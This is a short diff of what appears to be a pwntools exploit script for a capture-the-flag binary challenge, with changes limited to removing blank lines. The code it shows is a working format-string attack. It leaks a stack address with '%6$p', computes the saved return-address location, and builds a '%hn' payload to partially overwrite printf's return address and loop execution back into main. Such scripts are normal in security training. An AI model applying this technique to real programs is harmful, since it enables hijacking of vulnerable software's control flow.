@@ -21,16 +21,12 @@ def padding(written, bytes_to_write, maximum):
 payload = b"%6$p" # can only leak one address
 
 p.recvuntil(b"give you one chance!!!\n")
-
-
 p.sendline(payload)
 
 leak = p.recvline().strip().decode()
 leak = int(leak, 16)
 rip_pos = leak - 0x120
-
 print("Rip position: ", hex(rip_pos))
-
 # partial overwriting the first byte of return address of `printf` to 0x10, changing it to return to main+5
 bytes_to_write = rip_pos & 0xffff
 payload = f"%{bytes_to_write-4}c%c%c%c%c%hn".encode()
